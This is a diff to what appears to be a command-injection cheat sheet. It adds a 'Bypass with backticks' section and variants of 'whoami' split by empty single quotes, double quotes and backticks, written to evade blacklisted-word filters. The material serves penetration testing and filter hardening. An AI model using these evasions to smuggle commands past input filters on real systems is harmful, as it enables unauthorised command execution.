@@ -18,6 +18,7 @@
   * [Bypass blacklisted words](#bypass-blacklisted-words)
    * [Bypass with single quote](#bypass-with-single-quote)
    * [Bypass with double quote](#bypass-with-double-quote)
+   * [Bypass with backticks](#bypass-with-backticks)
    * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
    * [Bypass with $@](#bypass-with-)
    * [Bypass with $()](#bypass-with--1)
@@ -245,12 +246,20 @@ root:x:0:0:root:/root:/bin/bash
 
 ```powershell
 w'h'o'am'i
+wh''oami
 ```
 
 #### Bypass with double quote
 
 ```powershell
 w"h"o"am"i
+wh""oami
+```
+
+#### Bypass with backticks
+
+```powershell
+wh``oami
 ```
 
 #### Bypass with backslash and slash
